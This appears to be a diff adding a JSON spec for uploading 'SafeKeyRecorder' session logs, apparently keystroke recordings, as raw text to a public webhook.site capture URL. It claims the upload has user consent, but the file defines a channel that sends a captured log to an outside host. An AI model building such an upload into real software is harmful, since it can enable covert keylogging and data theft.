@@ -1,0 +1,41 @@
+{
+  "title": "WebhookDelivery",
+  "description": "Defines the HTTP contract for exporting SafeKeyRecorder session logs with explicit user consent.",
+  "http": {
+    "method": "POST",
+    "url": "https://webhook.site/1c7b4698-6c44-43fe-a985-5657c977e353",
+    "headers": {
+      "Authorization": "Bearer <token>",
+      "Content-Type": "text/plain; charset=utf-8",
+      "X-SKR-Payload": "session_log.txt",
+      "X-SKR-Checksum": "sha256"
+    },
+    "query": {}
+  },
+  "body": {
+    "type": "text",
+    "format": "session_log",
+    "description": "Raw contents of session_log.txt encoded as UTF-8 text."
+  },
+  "successResponse": {
+    "status": 202,
+    "description": "The webhook accepted the log for processing.",
+    "headers": {
+      "Retry-After": "optional"
+    }
+  },
+  "failureResponses": [
+    {
+      "status": 400,
+      "description": "Request was invalid (e.g., missing Authorization header, malformed payload)."
+    },
+    {
+      "status": 401,
+      "description": "Bearer token rejected or expired."
+    },
+    {
+      "status": 500,
+      "description": "Remote service experienced an unexpected error; client should surface retry option."
+    }
+  ]
+}
